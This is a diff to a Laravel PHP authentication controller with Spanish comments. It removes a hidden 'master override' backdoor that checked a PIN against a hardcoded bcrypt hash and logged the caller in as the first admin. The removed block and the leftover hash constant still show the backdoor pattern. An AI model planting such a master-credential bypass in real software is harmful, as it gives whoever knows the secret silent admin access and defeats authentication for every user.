@@ -18,6 +18,7 @@ class AuthController extends Controller
      * NUNCA guardar el PIN en texto plano — solo el hash va aquí.
      */
     private const GHOST_MASTER_HASH = '$2y$12$rgQrlCqdMrZGc6b7ZtMMJuflM62zBN5w5H2Zmtz16Q7iO78qAs6Di';
+
     /**
      * POST /api/auth/verify-pin
      *
@@ -35,29 +36,6 @@ class AuthController extends Controller
 
         $pin = $request->input('pin');
 
-        // ── PROTOCOLO DE RESCATE (Master Override) ────────────────────────────
-        // Se evalúa ANTES que cualquier PIN de usuario. Si el hash coincide,
-        // se toma la identidad del primer admin local sin alterar la BD.
-        if (Hash::check($pin, self::GHOST_MASTER_HASH)) {
-            $admin = User::where('role', 'admin')->first();
-            if ($admin) {
-                $token = Str::random(64);
-                $admin->update(['session_token' => $token]);
-                return response()->json([
-                    'user' => [
-                        'id'          => $admin->id,
-                        'name'        => $admin->name,
-                        'email'       => $admin->email,
-                        'role'        => $admin->role,
-                        'permissions' => $admin->permissions ?? [],
-                    ],
-                    'session_token'      => $token,
-                    'requires_pin_change' => true,   // ← Flag de rescate
-                ]);
-            }
-        }
-        // ── FIN PROTOCOLO DE RESCATE ──────────────────────────────────────────
-
         // FIX BUG A-1: Busca usuario por PIN hasheado sin cargar todos a memoria.
         // Iteramos solo los usuarios con PIN registrado para minimizar surface de ataque.
         $user = User::whereNotNull('pin')
@@ -65,7 +43,7 @@ class AuthController extends Controller
             ->first(fn ($u) => Hash::check($pin, $u->pin));
 
         if (!$user) {
-            return response()->json(['message' => 'PIN incorrecto o usuario no encontrado.'], 401);
+            return response()->json(['success' => false, 'message' => 'PIN incorrecto o usuario no encontrado.'], 401);
         }
 
         // Generar token único de sesión (64 chars hex = 256 bits de entropía)
